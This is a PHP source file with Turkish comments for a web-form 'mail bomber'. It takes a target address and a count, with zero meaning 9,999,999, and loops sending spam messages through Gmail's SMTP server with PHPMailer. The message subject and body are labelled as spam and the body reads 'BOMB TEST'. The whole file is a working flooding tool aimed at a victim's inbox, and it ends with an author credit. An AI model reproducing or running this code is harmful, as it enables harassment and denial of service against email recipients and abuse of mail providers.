<?php
set_time_limit(0);
$self 	= $_SERVER['PHP_SELF'];
$mail2	= @$_POST['ucanmail'];
$adet	= @$_POST['adet'];
echo "<form action='$self' method='POST'>
Send To -> <input type='text' name='ucanmail' /> <br>How Many? (0 = unlimited)<input type='number' name='adet' value='0'/><input type='submit' value='Send' />";
include ("ayarlar.php");
// PHPMailer Kütüphanesi Yardımıyla Mail Bombalama İşlemi.  İndirmek isteyenler için -> http://code.google.com/a/apache-extras.org/p/phpmailer/
include("class.phpmailer.php");
include("class.smtp.php"); // class.phpmailer.php çalışmaz ise burdan devam edicek. Çalışıp çalışmamasını kütüphane kendisi karar veriyor...
if($adet=="0"){
	$adet = 9999999;
}
if($mail2!=""){
	for($a=1;$a<=$adet;$a++){
$mail             = new PHPMailer();
$mail->IsSMTP();
$mail->SMTPAuth   = true;                  // SMTP Güvenlik Doğrulamasını Aktif Ediyoruz
$mail->SMTPSecure = "ssl";                 // SMTP Gizlilik Türü ssl yada tls
$mail->Host       = "smtp.gmail.com";      // SMTP Sunucusunu Belirliyoruz.
$mail->Port       = 465;                   // SMTP Portunu belirliyoruz.

$mail->Username   = $mailkadi;  // GMAIL kullanıcı adımız
$mail->Password   = $mailsifre;            // GMAIL şifremiz

$mail->From       = "furkansandalcomads@gmail.com";
$mail->FromName   = "Spam Başlığı.";
$mail->Subject    = "Spam Konusu....";
$mail->AltBody    = "Spam içeriği, lorem ipsum -> Lorem Ipsum Die Sit AmerLorem Ipsum Die Sit AmerLorem Ipsum Die Sit AmerLorem Ipsum Die Sit AmerLorem Ipsum Die Sit AmerLorem Ipsum Die Sit AmerLorem Ipsum Die Sit AmerLorem Ipsum Die Sit Amer"; //Yollanacak Yazı
$mail->WordWrap   = 50; // set word wrap

$mail->MsgHTML("BOMB TEST ");


$mail->AddAddress($mail2 ,"Hi Bro :d");

if(!$mail->Send()) {
  echo "Mail yollarken hata sebep : " . $mail->ErrorInfo;
} else {
  echo "$a,";
}
}
}else{
	echo "<br><br><br><b>Developed by <a href='https://github.com/furkansandal' >Furkan Sandal </a> @furkansandal -> Instagram";
	die();
}
echo "tane yollandı.<br><br><br><b>Developed by <a href='https://github.com/furkansandal' >Furkan Sandal </a> @furkansandal -> Instagram";
?>
